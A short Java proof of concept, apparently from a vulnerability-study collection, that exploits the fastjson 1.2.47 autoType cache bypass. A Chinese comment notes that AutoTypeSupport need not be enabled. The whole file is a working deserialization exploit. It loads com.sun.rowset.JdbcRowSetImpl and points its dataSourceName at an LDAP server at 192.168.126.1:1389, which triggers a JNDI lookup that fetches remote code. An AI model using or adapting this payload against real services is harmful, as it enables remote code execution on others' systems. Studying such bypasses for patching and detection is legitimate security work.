package vul;

import com.alibaba.fastjson.JSON;

public class Bypass_47 {
    public static void main(String[] argv){
        //无需开启AutoTypeSupport，基于缓存机制
        String payload  = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"
                + "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
                + "\"dataSourceName\":\"ldap://192.168.126.1:1389/us9a9o\",\"autoCommit\":true}}";
        JSON.parse(payload);
    }
}